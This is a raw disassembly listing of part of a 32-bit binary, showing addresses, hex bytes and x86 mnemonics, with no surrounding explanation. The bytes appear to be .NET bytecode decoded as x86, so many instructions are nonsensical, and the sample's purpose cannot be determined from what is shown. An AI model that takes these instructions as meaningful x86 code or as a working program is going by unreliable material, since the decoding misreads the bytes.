  402b2a:	0a 6f 4d             	or     0x4d(%edi),%ch
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	0a 02                	or     (%edx),%al
  402b31:	80 07 00             	addb   $0x0,(%edi)
  402b34:	00 04 17             	add    %al,(%edi,%edx,1)
  402b37:	80 10 00             	adcb   $0x0,(%eax)
  402b3a:	00 04 73             	add    %al,(%ebx,%esi,2)
  402b3d:	28 00                	sub    %al,(%eax)
  402b3f:	00 0a                	add    %cl,(%edx)
  402b41:	28 22                	sub    %ah,(%edx)
  402b43:	00 00                	add    %al,(%eax)
  402b45:	0a 80 17 00 00 04    	or     0x4000017(%eax),%al
  402b4b:	28 3b                	sub    %bh,(%ebx)
  402b4d:	00 00                	add    %al,(%eax)
  402b4f:	06                   	push   %es
  402b50:	28 2d 00 00 0a 28    	sub    %ch,0x280a0000
  402b56:	45                   	inc    %ebp
  402b57:	00 00                	add    %al,(%eax)
  402b59:	06                   	push   %es
  402b5a:	16                   	push   %ss
  402b5b:	80 1a 00             	sbbb   $0x0,(%edx)
  402b5e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402b61:	11 00                	adc    %eax,(%eax)
  402b63:	00 04 7e             	add    %al,(%esi,%edi,2)
  402b66:	13 00                	adc    (%eax),%eax
  402b68:	00 04 16             	add    %al,(%esi,%edx,1)
  402b6b:	7e 13                	jle    0x402b80
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	04 8e                	add    $0x8e,%al
  402b71:	b7 16                	mov    $0x16,%bh
  402b73:	14 fe                	adc    $0xfe,%al
  402b75:	06                   	push   %es
  402b76:	43                   	inc    %ebx
  402b77:	00 00                	add    %al,(%eax)
  402b79:	06                   	push   %es
  402b7a:	73 4e                	jae    0x402bca
  402b7c:	00 00                	add    %al,(%eax)
  402b7e:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402b81:	4f                   	dec    %edi
  402b82:	00 00                	add    %al,(%eax)
  402b84:	0a 26                	or     (%esi),%ah
  402b86:	14 fe                	adc    $0xfe,%al
  402b88:	06                   	push   %es
  402b89:	4a                   	dec    %edx
  402b8a:	00 00                	add    %al,(%eax)
  402b8c:	06                   	push   %es
  402b8d:	73 50                	jae    0x402bdf
  402b8f:	00 00                	add    %al,(%eax)
  402b91:	0a 0b                	or     (%ebx),%cl
  402b93:	07                   	pop    %es
  402b94:	14 73                	adc    $0x73,%al
  402b96:	40                   	inc    %eax
  402b97:	00 00                	add    %al,(%eax)
  402b99:	0a 20                	or     (%eax),%ah
  402b9b:	10 27                	adc    %ah,(%edi)
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402ba5:	41                   	inc    %ecx
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	0a 73 40             	or     0x40(%ebx),%dh
  402bab:	00 00                	add    %al,(%eax)
  402bad:	0a 20                	or     (%eax),%ah
  402baf:	10 27                	adc    %ah,(%edi)
  402bb1:	00 00                	add    %al,(%eax)
  402bb3:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bb9:	41                   	inc    %ecx
  402bba:	00 00                	add    %al,(%eax)
  402bbc:	0a 73 51             	or     0x51(%ebx),%dh
  402bbf:	00 00                	add    %al,(%eax)
  402bc1:	0a 80 15 00 00 04    	or     0x4000015(%eax),%al
  402bc7:	14 fe                	adc    $0xfe,%al
  402bc9:	06                   	push   %es
  402bca:	48                   	dec    %eax
  402bcb:	00 00                	add    %al,(%eax)
  402bcd:	06                   	push   %es
  402bce:	73 50                	jae    0x402c20
  402bd0:	00 00                	add    %al,(%eax)
  402bd2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402bd5:	17                   	pop    %ss
  402bd6:	73 51                	jae    0x402c29
  402bd8:	00 00                	add    %al,(%eax)
  402bda:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  402be0:	de 20                	fisubs (%eax)
  402be2:	25 28 2e 00 00       	and    $0x2e28,%eax
  402be7:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402bea:	80 10 00             	adcb   $0x0,(%eax)
  402bed:	00 04 28             	add    %al,(%eax,%ebp,1)
  402bf0:	30 00                	xor    %al,(%eax)
  402bf2:	00 0a                	add    %cl,(%edx)
  402bf4:	de 0c 7e             	fimuls (%esi,%edi,2)
  402bf7:	16                   	push   %ss
  402bf8:	00 00                	add    %al,(%eax)
  402bfa:	04 6f                	add    $0x6f,%al
  402bfc:	52                   	push   %edx
  402bfd:	00 00                	add    %al,(%eax)
  402bff:	0a 26                	or     (%esi),%ah
  402c01:	dc 06                	faddl  (%esi)
  402c03:	2a 41 34             	sub    0x34(%ecx),%al
	...
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	0e                   	push   %cs
  402c11:	01 00                	add    %eax,(%eax)
  402c13:	00 0e                	add    %cl,(%esi)
  402c15:	01 00                	add    %eax,(%eax)
  402c17:	00 14 00             	add    %dl,(%eax,%eax,1)
  402c1a:	00 00                	add    %al,(%eax)
  402c1c:	32 00                	xor    (%eax),%al
  402c1e:	00 01                	add    %al,(%ecx)
  402c20:	02 00                	add    (%eax),%al
  402c22:	00 00                	add    %al,(%eax)
  402c24:	00 00                	add    %al,(%eax)
  402c26:	00 00                	add    %al,(%eax)
  402c28:	22 01                	and    (%ecx),%al
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	22 01                	and    (%ecx),%al
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	0c 00                	or     $0x0,%al
  402c32:	00 00                	add    %al,(%eax)
  402c34:	00 00                	add    %al,(%eax)
  402c36:	00 00                	add    %al,(%eax)
  402c38:	13 30                	adc    (%eax),%esi
  402c3a:	05 00 58 01 00       	add    $0x15800,%eax
  402c3f:	00 0f                	add    %cl,(%edi)
  402c41:	00 00                	add    %al,(%eax)
  402c43:	11 73 53             	adc    %esi,0x53(%ebx)
  402c46:	00 00                	add    %al,(%eax)
  402c48:	0a 0b                	or     (%ebx),%cl
  402c4a:	1f                   	pop    %ds
  402c4b:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  402c51:	0d 09 16 72 b5       	or     $0xb5721609,%eax
  402c56:	04 00                	add    $0x0,%al
  402c58:	70 a2                	jo     0x402bfc
  402c5a:	09 17                	or     %edx,(%edi)
  402c5c:	7e 0a                	jle    0x402c68
  402c5e:	00 00                	add    %al,(%eax)
  402c60:	04 a2                	add    $0xa2,%al
  402c62:	09 18                	or     %ebx,(%eax)
  402c64:	28 08                	sub    %cl,(%eax)
  402c66:	01 00                	add    %eax,(%eax)
  402c68:	06                   	push   %es
  402c69:	a2 09 19 7e 0a       	mov    %al,0xa7e1909
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	04 a2                	add    $0xa2,%al
  402c72:	09 1a                	or     %ebx,(%edx)
  402c74:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402c78:	0a a2 09 1b 7e 0a    	or     0xa7e1b09(%edx),%ah
  402c7e:	00 00                	add    %al,(%eax)
  402c80:	04 a2                	add    $0xa2,%al
  402c82:	09 1c 07             	or     %ebx,(%edi,%eax,1)
  402c85:	6f                   	outsl  %ds:(%esi),(%dx)
  402c86:	55                   	push   %ebp
  402c87:	00 00                	add    %al,(%eax)
  402c89:	0a 72 bf             	or     -0x41(%edx),%dh
  402c8c:	04 00                	add    $0x0,%al
  402c8e:	70 14                	jo     0x402ca4
  402c90:	6f                   	outsl  %ds:(%esi),(%dx)
  402c91:	56                   	push   %esi
  402c92:	00 00                	add    %al,(%eax)
  402c94:	0a a2 09 1d 28 57    	or     0x57281d09(%edx),%ah
  402c9a:	00 00                	add    %al,(%eax)
  402c9c:	0a 6f 58             	or     0x58(%edi),%ch
  402c9f:	00 00                	add    %al,(%eax)
  402ca1:	0a 72 d3             	or     -0x2d(%edx),%dh
  402ca4:	04 00                	add    $0x0,%al
  402ca6:	70 72                	jo     0x402d1a
  402ca8:	ed                   	in     (%dx),%eax
  402ca9:	04 00                	add    $0x0,%al
  402cab:	70 6f                	jo     0x402d1c
  402cad:	56                   	push   %esi
  402cae:	00 00                	add    %al,(%eax)
  402cb0:	0a 72 f3             	or     -0xd(%edx),%dh
  402cb3:	04 00                	add    $0x0,%al
  402cb5:	70 28                	jo     0x402cdf
  402cb7:	2b 00                	sub    (%eax),%eax
  402cb9:	00 0a                	add    %cl,(%edx)
  402cbb:	a2 09 1e 28 59       	mov    %al,0x59281e09
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402cc5:	02 28                	add    (%eax),%ch
  402cc7:	5a                   	pop    %edx
  402cc8:	00 00                	add    %al,(%eax)
  402cca:	0a 72 f7             	or     -0x9(%edx),%dh
  402ccd:	04 00                	add    $0x0,%al
  402ccf:	70 72                	jo     0x402d43
  402cd1:	03 05 00 70 6f 56    	add    0x566f7000,%eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 72 0f             	or     0xf(%edx),%dh
  402cdc:	05 00 70 72 19       	add    $0x19727000,%eax
  402ce1:	05 00 70 6f 56       	add    $0x566f7000,%eax
  402ce6:	00 00                	add    %al,(%eax)
  402ce8:	0a a2 09 1f 09 7e    	or     0x7e091f09(%edx),%ah
  402cee:	0a 00                	or     (%eax),%al
  402cf0:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402cf3:	09 1f                	or     %ebx,(%edi)
  402cf5:	0a 7e 0c             	or     0xc(%esi),%bh
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	04 a2                	add    $0xa2,%al
  402cfc:	09 1f                	or     %ebx,(%edi)
  402cfe:	0b 7e 0a             	or     0xa(%esi),%edi
  402d01:	00 00                	add    %al,(%eax)
  402d03:	04 a2                	add    $0xa2,%al
  402d05:	09 1f                	or     %ebx,(%edi)
  402d07:	0c 28                	or     $0x28,%al
  402d09:	3c 00                	cmp    $0x0,%al
  402d0b:	00 06                	add    %al,(%esi)
  402d0d:	a2 09 1f 0d 7e       	mov    %al,0x7e0d1f09
  402d12:	0a 00                	or     (%eax),%al
  402d14:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d17:	09 1f                	or     %ebx,(%edi)
  402d19:	0e                   	push   %cs
  402d1a:	28 3d 00 00 06 a2    	sub    %bh,0xa2060000
  402d20:	09 1f                	or     %ebx,(%edi)
  402d22:	0f 7e 0a             	movd   %mm1,(%edx)
  402d25:	00 00                	add    %al,(%eax)
  402d27:	04 a2                	add    $0xa2,%al
  402d29:	09 1f                	or     %ebx,(%edi)
  402d2b:	10 28                	adc    %ch,(%eax)
  402d2d:	3e 00 00             	add    %al,%ds:(%eax)
  402d30:	06                   	push   %es
  402d31:	a2 09 1f 11 7e       	mov    %al,0x7e111f09
  402d36:	0a 00                	or     (%eax),%al
  402d38:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d3b:	09 1f                	or     %ebx,(%edi)
  402d3d:	12 28                	adc    (%eax),%ch
  402d3f:	80 00 00             	addb   $0x0,(%eax)
  402d42:	06                   	push   %es
  402d43:	8c 48 00             	mov    %cs,0x0(%eax)
  402d46:	00 01                	add    %al,(%ecx)
  402d48:	a2 09 1f 13 7e       	mov    %al,0x7e131f09
  402d4d:	0a 00                	or     (%eax),%al
  402d4f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d52:	09 1f                	or     %ebx,(%edi)
  402d54:	14 28                	adc    $0x28,%al
  402d56:	41                   	inc    %ecx
  402d57:	00 00                	add    %al,(%eax)
  402d59:	06                   	push   %es
  402d5a:	a2 09 1f 15 7e       	mov    %al,0x7e151f09
  402d5f:	0a 00                	or     (%eax),%al
  402d61:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d64:	09 1f                	or     %ebx,(%edi)
  402d66:	16                   	push   %ss
  402d67:	28 40 00             	sub    %al,0x0(%eax)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	a2 09 1f 17 7e       	mov    %al,0x7e171f09
  402d71:	0a 00                	or     (%eax),%al
  402d73:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d76:	09 1f                	or     %ebx,(%edi)
  402d78:	18 28                	sbb    %ch,(%eax)
  402d7a:	42                   	inc    %edx
  402d7b:	00 00                	add    %al,(%eax)
  402d7d:	06                   	push   %es
  402d7e:	a2 09 1f 19 7e       	mov    %al,0x7e191f09
  402d83:	0a 00                	or     (%eax),%al
  402d85:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d88:	09 1f                	or     %ebx,(%edi)
  402d8a:	1a 28                	sbb    (%eax),%ch
  402d8c:	3f                   	aas
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	a2 09 28 5b 00       	mov    %al,0x5b2809
  402d95:	00 0a                	add    %cl,(%edx)
  402d97:	0a 2b                	or     (%ebx),%ch
  402d99:	00 06                	add    %al,(%esi)
  402d9b:	2a 1b                	sub    (%ebx),%bl
  402d9d:	30 02                	xor    %al,(%edx)
  402d9f:	00 40 00             	add    %al,0x0(%eax)
  402da2:	00 00                	add    %al,(%eax)
  402da4:	10 00                	adc    %al,(%eax)
  402da6:	00 11                	add    %dl,(%ecx)
  402da8:	7e 2b                	jle    0x402dd5
  402daa:	00 00                	add    %al,(%eax)
  402dac:	04 73                	add    $0x73,%al
  402dae:	5c                   	pop    %esp
  402daf:	00 00                	add    %al,(%eax)
  402db1:	0a 0b                	or     (%ebx),%cl
  402db3:	07                   	pop    %es
  402db4:	6f                   	outsl  %ds:(%esi),(%dx)
  402db5:	5d                   	pop    %ebp
  402db6:	00 00                	add    %al,(%eax)
  402db8:	0a 0d 12 03 72 25    	or     0x25720312,%cl
  402dbe:	05 00 70 28 5e       	add    $0x5e287000,%eax
  402dc3:	00 00                	add    %al,(%eax)
  402dc5:	0a 0a                	or     (%edx),%cl
  402dc7:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402dcd:	2e 00 00             	add    %al,%cs:(%eax)
  402dd0:	0a 0c 72             	or     (%edx,%esi,2),%cl
  402dd3:	39 05 00 70 0a 28    	cmp    %eax,0x280a7000
  402dd9:	30 00                	xor    %al,(%eax)
  402ddb:	00 0a                	add    %cl,(%edx)
  402ddd:	de 07                	fiadds (%edi)
  402ddf:	28 30                	sub    %dh,(%eax)
  402de1:	00 00                	add    %al,(%eax)
  402de3:	0a de                	or     %dh,%bl
  402de5:	00 06                	add    %al,(%esi)
  402de7:	2a 01                	sub    (%ecx),%al
  402de9:	10 00                	adc    %al,(%eax)
  402deb:	00 00                	add    %al,(%eax)
  402ded:	00 00                	add    %al,(%eax)
  402def:	00 23                	add    %ah,(%ebx)
  402df1:	23 00                	and    (%eax),%eax
  402df3:	1b 32                	sbb    (%edx),%esi
  402df5:	00 00                	add    %al,(%eax)
  402df7:	01 1b                	add    %ebx,(%ebx)
  402df9:	30 03                	xor    %al,(%ebx)
  402dfb:	00 49 00             	add    %cl,0x0(%ecx)
  402dfe:	00 00                	add    %al,(%eax)
  402e00:	11 00                	adc    %eax,(%eax)
  402e02:	00 11                	add    %dl,(%ecx)
  402e04:	7e 2b                	jle    0x402e31
  402e06:	00 00                	add    %al,(%eax)
  402e08:	04 28                	add    $0x28,%al
  402e0a:	5f                   	pop    %edi
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	0a 7e 0d             	or     0xd(%esi),%bh
  402e10:	00 00                	add    %al,(%eax)
  402e12:	04 16                	add    $0x16,%al
  402e14:	28 60 00             	sub    %ah,0x0(%eax)
  402e17:	00 0a                	add    %cl,(%edx)
  402e19:	16                   	push   %ss
  402e1a:	33 0a                	xor    (%edx),%ecx
  402e1c:	72 0f                	jb     0x402e2d
  402e1e:	05 00 70 0a de       	add    $0xde0a7000,%eax
  402e23:	27                   	daa
  402e24:	2b 08                	sub    (%eax),%ecx
  402e26:	72 f7                	jb     0x402e1f
  402e28:	04 00                	add    $0x0,%al
  402e2a:	70 0a                	jo     0x402e36
  402e2c:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402e32:	2e 00 00             	add    %al,%cs:(%eax)
  402e35:	0a 0b                	or     (%ebx),%cl
  402e37:	72 39                	jb     0x402e72
  402e39:	05 00 70 0a 28       	add    $0x280a7000,%eax
  402e3e:	30 00                	xor    %al,(%eax)
  402e40:	00 0a                	add    %cl,(%edx)
  402e42:	de 07                	fiadds (%edi)
  402e44:	28 30                	sub    %dh,(%eax)
  402e46:	00 00                	add    %al,(%eax)
  402e48:	0a de                	or     %dh,%bl
  402e4a:	00 06                	add    %al,(%esi)
  402e4c:	2a 00                	sub    (%eax),%al
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	01 10                	add    %edx,(%eax)
  402e52:	00 00                	add    %al,(%eax)
  402e54:	00 00                	add    %al,(%eax)
  402e56:	00 00                	add    %al,(%eax)
  402e58:	2c 2c                	sub    $0x2c,%al
  402e5a:	00 1b                	add    %bl,(%ebx)
  402e5c:	32 00                	xor    (%eax),%al
  402e5e:	00 01                	add    %al,(%ecx)
  402e60:	1b 30                	sbb    (%eax),%esi
  402e62:	02 00                	add    (%eax),%al
  402e64:	3e 00 00             	add    %al,%ds:(%eax)
  402e67:	00 12                	add    %dl,(%edx)
  402e69:	00 00                	add    %al,(%eax)
  402e6b:	11 28                	adc    %ebp,(%eax)
  402e6d:	61                   	popa
  402e6e:	00 00                	add    %al,(%eax)
  402e70:	0a 73 62             	or     0x62(%ebx),%dh
  402e73:	00 00                	add    %al,(%eax)
  402e75:	0a 20                	or     (%eax),%ah
  402e77:	20 02                	and    %al,(%edx)
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e7c:	63 00                	arpl   %eax,(%eax)
  402e7e:	00 0a                	add    %cl,(%edx)
  402e80:	0c 12                	or     $0x12,%al
  402e82:	02 28                	add    (%eax),%ch
  402e84:	5a                   	pop    %edx
  402e85:	00 00                	add    %al,(%eax)
  402e87:	0a 0a                	or     (%edx),%cl
  402e89:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402e8f:	2e 00 00             	add    %al,%cs:(%eax)
  402e92:	0a 0b                	or     (%ebx),%cl
  402e94:	72 39                	jb     0x402ecf
  402e96:	05 00 70 0a 28       	add    $0x280a7000,%eax
  402e9b:	30 00                	xor    %al,(%eax)
  402e9d:	00 0a                	add    %cl,(%edx)
  402e9f:	de 07                	fiadds (%edi)
  402ea1:	28 30                	sub    %dh,(%eax)
  402ea3:	00 00                	add    %al,(%eax)
  402ea5:	0a de                	or     %dh,%bl
  402ea7:	00 06                	add    %al,(%esi)
  402ea9:	2a 00                	sub    (%eax),%al
  402eab:	00 01                	add    %al,(%ecx)
  402ead:	10 00                	adc    %al,(%eax)
  402eaf:	00 00                	add    %al,(%eax)
  402eb1:	00 00                	add    %al,(%eax)
  402eb3:	00 21                	add    %ah,(%ecx)
  402eb5:	21 00                	and    %eax,(%eax)
  402eb7:	1b 32                	sbb    (%edx),%esi
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	01 1b                	add    %ebx,(%ebx)
  402ebd:	30 04 00             	xor    %al,(%eax,%eax,1)
  402ec0:	cf                   	iret
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	00 13                	add    %dl,(%ebx)
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	11 72 45             	adc    %esi,0x45(%edx)
  402eca:	05 00 70 28 64       	add    $0x64287000,%eax
  402ecf:	00 00                	add    %al,(%eax)
  402ed1:	0a 72 4b             	or     0x4b(%edx),%dh
  402ed4:	05 00 70 28 39       	add    $0x39287000,%eax
  402ed9:	00 00                	add    %al,(%eax)
  402edb:	0a 72 77             	or     0x77(%edx),%dh
  402ede:	05 00 70 73 65       	add    $0x65737000,%eax
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	0a 0b                	or     (%ebx),%cl
  402ee7:	73 66                	jae    0x402f4f
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	0a 0c 07             	or     (%edi,%eax,1),%cl
  402eee:	6f                   	outsl  %ds:(%esi),(%dx)
  402eef:	67 00 00             	add    %al,(%bx,%si)
  402ef2:	0a 6f 68             	or     0x68(%edi),%ch
  402ef5:	00 00                	add    %al,(%eax)
  402ef7:	0a 13                	or     (%ebx),%dl
  402ef9:	05 2b 2b 11 05       	add    $0x5112b2b,%eax
  402efe:	6f                   	outsl  %ds:(%esi),(%dx)
  402eff:	69 00 00 0a 0d 08    	imul   $0x80d0a00,(%eax),%eax
  402f05:	09 72 b5             	or     %esi,-0x4b(%edx)
  402f08:	05 00 70 6f 6a       	add    $0x6a6f7000,%eax
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	0a 6f 26             	or     0x26(%edi),%ch
  402f12:	00 00                	add    %al,(%eax)
  402f14:	0a 6f 6b             	or     0x6b(%edi),%ch
  402f17:	00 00                	add    %al,(%eax)
  402f19:	0a 26                	or     (%esi),%ah
  402f1b:	08 72 cd             	or     %dh,-0x33(%edx)
  402f1e:	05 00 70 6f 6b       	add    $0x6b6f7000,%eax
  402f23:	00 00                	add    %al,(%eax)
  402f25:	0a 26                	or     (%esi),%ah
  402f27:	11 05 6f 6c 00 00    	adc    %eax,0x6c6f
  402f2d:	0a 2d cc de 0c 11    	or     0x110cdecc,%ch
  402f33:	05 2c 07 11 05       	add    $0x511072c,%eax
  402f38:	6f                   	outsl  %ds:(%esi),(%dx)
  402f39:	6d                   	insl   (%dx),%es:(%edi)
  402f3a:	00 00                	add    %al,(%eax)
  402f3c:	0a dc                	or     %ah,%bl
  402f3e:	08 6f 6e             	or     %ch,0x6e(%edi)
  402f41:	00 00                	add    %al,(%eax)
  402f43:	0a 6f 6f             	or     0x6f(%edi),%ch
  402f46:	00 00                	add    %al,(%eax)
  402f48:	0a 16                	or     (%esi),%dl
  402f4a:	33 08                	xor    (%eax),%ecx
  402f4c:	72 d1                	jb     0x402f1f
  402f4e:	05 00 70 0a de       	add    $0xde0a7000,%eax
  402f53:	41                   	inc    %ecx
  402f54:	08 6f 6e             	or     %ch,0x6e(%edi)
  402f57:	00 00                	add    %al,(%eax)
  402f59:	0a 16                	or     (%esi),%dl
  402f5b:	08 6f 70             	or     %ch,0x70(%edi)
  402f5e:	00 00                	add    %al,(%eax)
  402f60:	0a 17                	or     (%edi),%dl
  402f62:	da 6f 71             	fisubrl 0x71(%edi)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	0a 0a                	or     (%edx),%cl
  402f69:	de 2a                	fisubrs (%edx)
  402f6b:	de 0a                	fimuls (%edx)
  402f6d:	07                   	pop    %es
  402f6e:	2c 06                	sub    $0x6,%al
  402f70:	07                   	pop    %es
  402f71:	6f                   	outsl  %ds:(%esi),(%dx)
  402f72:	6d                   	insl   (%dx),%es:(%edi)
  402f73:	00 00                	add    %al,(%eax)
  402f75:	0a dc                	or     %ah,%bl
  402f77:	de 1c 25 28 2e 00 00 	ficomps 0x2e28(,%eiz,1)
  402f7e:	0a 13                	or     (%ebx),%dl
  402f80:	04 72                	add    $0x72,%al
  402f82:	d1 05 00 70 0a 28    	roll   $1,0x280a7000
  402f88:	30 00                	xor    %al,(%eax)
  402f8a:	00 0a                	add    %cl,(%edx)
  402f8c:	de 07                	fiadds (%edi)
  402f8e:	28 30                	sub    %dh,(%eax)
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a de                	or     %dh,%bl
  402f94:	00 06                	add    %al,(%esi)
  402f96:	2a 00                	sub    (%eax),%al
  402f98:	01 28                	add    %ebp,(%eax)
  402f9a:	00 00                	add    %al,(%eax)
  402f9c:	02 00                	add    (%eax),%al
  402f9e:	25 00 45 6a 00       	and    $0x6a4500,%eax
  402fa3:	0c 00                	or     $0x0,%al
  402fa5:	00 00                	add    %al,(%eax)
  402fa7:	00 02                	add    %al,(%edx)
  402fa9:	00 1f                	add    %bl,(%edi)
  402fab:	00 86 a5 00 0a 00    	add    %al,0xa00a5(%esi)
  402fb1:	00 00                	add    %al,(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	00 00                	add    %al,(%eax)
  402fb7:	00 b1 b1 00 1c 32    	add    %dh,0x321c00b1(%ecx)
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	01 1b                	add    %ebx,(%ebx)
  402fc1:	30 03                	xor    %al,(%ebx)
  402fc3:	00 8f 00 00 00 14    	add    %cl,0x14000000(%edi)
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	11 7e 72             	adc    %edi,0x72(%esi)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	0a 0d 72 db 05 00    	or     0x5db72,%cl
  402fd6:	70 73                	jo     0x40304b
  402fd8:	73 00                	jae    0x402fda
  402fda:	00 0a                	add    %cl,(%edx)
  402fdc:	0b 07                	or     (%edi),%eax
  402fde:	73 74                	jae    0x403054
  402fe0:	00 00                	add    %al,(%eax)
  402fe2:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fe6:	67 00 00             	add    %al,(%bx,%si)
  402fe9:	0a 6f 68             	or     0x68(%edi),%ch
  402fec:	00 00                	add    %al,(%eax)
  402fee:	0a 13                	or     (%ebx),%dl
  402ff0:	05 2b 30 11 05       	add    $0x511302b,%eax
  402ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff6:	69 00 00 0a 74 57    	imul   $0x57740a00,(%eax),%eax
  402ffc:	00 00                	add    %al,(%eax)
  402ffe:	01 13                	add    %edx,(%ebx)
  403000:	04 09                	add    $0x9,%al
  403002:	11 04 72             	adc    %eax,(%edx,%esi,2)
  403005:	23 06                	and    (%esi),%eax
  403007:	00 70 6f             	add    %dh,0x6f(%eax)
  40300a:	6a 00                	push   $0x0
  40300c:	00 0a                	add    %cl,(%edx)
  40300e:	28 75 00             	sub    %dh,0x0(%ebp)
  403011:	00 0a                	add    %cl,(%edx)
  403013:	72 f3                	jb     0x403008
  403015:	04 00                	add    $0x0,%al
  403017:	70 28                	jo     0x403041
  403019:	75 00                	jne    0x40301b
  40301b:	00 0a                	add    %cl,(%edx)
  40301d:	28 2d 00 00 0a 0d    	sub    %ch,0xd0a0000
  403023:	11 05 6f 6c 00 00    	adc    %eax,0x6c6f
  403029:	0a 2d c7 de 0c 11    	or     0x110cdec7,%ch
  40302f:	05 2c 07 11 05       	add    $0x511072c,%eax
  403034:	6f                   	outsl  %ds:(%esi),(%dx)
  403035:	6d                   	insl   (%dx),%es:(%edi)
  403036:	00 00                	add    %al,(%eax)
  403038:	0a dc                	or     %ah,%bl
  40303a:	09 0a                	or     %ecx,(%edx)
  40303c:	de 1b                	ficomps (%ebx)
  40303e:	de 19                	ficomps (%ecx)
  403040:	28 2e                	sub    %ch,(%esi)
  403042:	00 00                	add    %al,(%eax)
  403044:	0a 72 39             	or     0x39(%edx),%dh
  403047:	05 00 70 0a 28       	add    $0x280a7000,%eax
  40304c:	30 00                	xor    %al,(%eax)
  40304e:	00 0a                	add    %cl,(%edx)
  403050:	de 07                	fiadds (%edi)
  403052:	28 30                	sub    %dh,(%eax)
  403054:	00 00                	add    %al,(%eax)
  403056:	0a de                	or     %dh,%bl
  403058:	00 06                	add    %al,(%esi)
  40305a:	2a 00                	sub    (%eax),%al
  40305c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40305f:	00 02                	add    %al,(%edx)
  403061:	00 18                	add    %bl,(%eax)
  403063:	00 4a 62             	add    %cl,0x62(%edx)
  403066:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403069:	00 00                	add    %al,(%eax)
  40306b:	00 00                	add    %al,(%eax)
  40306d:	00 00                	add    %al,(%eax)
  40306f:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  403073:	19 32                	sbb    %esi,(%edx)
  403075:	00 00                	add    %al,(%eax)
  403077:	01 1b                	add    %ebx,(%ebx)
  403079:	30 03                	xor    %al,(%ebx)
  40307b:	00 83 00 00 00 15    	add    %al,0x15000000(%ebx)
  403081:	00 00                	add    %al,(%eax)
  403083:	11 72 2d             	adc    %esi,0x2d(%edx)
  403086:	06                   	push   %es
  403087:	00 70 73             	add    %dh,0x73(%eax)
  40308a:	76 00                	jbe    0x40308c
  40308c:	00 0a                	add    %cl,(%edx)
  40308e:	0b 07                	or     (%edi),%eax
  403090:	6f                   	outsl  %ds:(%esi),(%dx)
  403091:	77 00                	ja     0x403093
  403093:	00 0a                	add    %cl,(%edx)
  403095:	07                   	pop    %es
  403096:	72 23                	jb     0x4030bb
  403098:	06                   	push   %es
  403099:	00 70 6f             	add    %dh,0x6f(%eax)
  40309c:	6a 00                	push   $0x0
  40309e:	00 0a                	add    %cl,(%edx)
  4030a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a1:	26 00 00             	add    %al,%es:(%eax)
  4030a4:	0a 72 6d             	or     0x6d(%edx),%dh
  4030a7:	06                   	push   %es
  4030a8:	00 70 72             	add    %dh,0x72(%eax)
  4030ab:	75 06                	jne    0x4030b3
  4030ad:	00 70 6f             	add    %dh,0x6f(%eax)
  4030b0:	56                   	push   %esi
  4030b1:	00 00                	add    %al,(%eax)
  4030b3:	0a 72 77             	or     0x77(%edx),%dh
  4030b6:	06                   	push   %es
  4030b7:	00 70 72             	add    %dh,0x72(%eax)
  4030ba:	75 06                	jne    0x4030c2
  4030bc:	00 70 6f             	add    %dh,0x6f(%eax)
  4030bf:	56                   	push   %esi
  4030c0:	00 00                	add    %al,(%eax)
  4030c2:	0a 72 89             	or     -0x77(%edx),%dh
  4030c5:	06                   	push   %es
  4030c6:	00 70 72             	add    %dh,0x72(%eax)
  4030c9:	75 06                	jne    0x4030d1
  4030cb:	00 70 6f             	add    %dh,0x6f(%eax)
  4030ce:	56                   	push   %esi
  4030cf:	00 00                	add    %al,(%eax)
